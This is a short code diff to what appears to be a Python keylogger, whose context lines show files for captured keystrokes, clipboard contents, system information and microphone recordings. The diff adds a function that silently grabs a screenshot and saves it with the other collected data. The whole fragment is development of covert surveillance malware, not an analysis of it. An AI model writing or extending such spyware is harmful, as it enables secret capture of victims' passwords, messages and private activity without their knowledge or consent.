@@ -39,6 +39,7 @@ keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
 
 microphone_time = 10
 
@@ -143,7 +144,11 @@ def microphone():
 microphone()
 
 
+def screenshot():
+    im= ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
 
+screenshot()
 
 count = 0
 keys = []  # each pressed key will be appended here
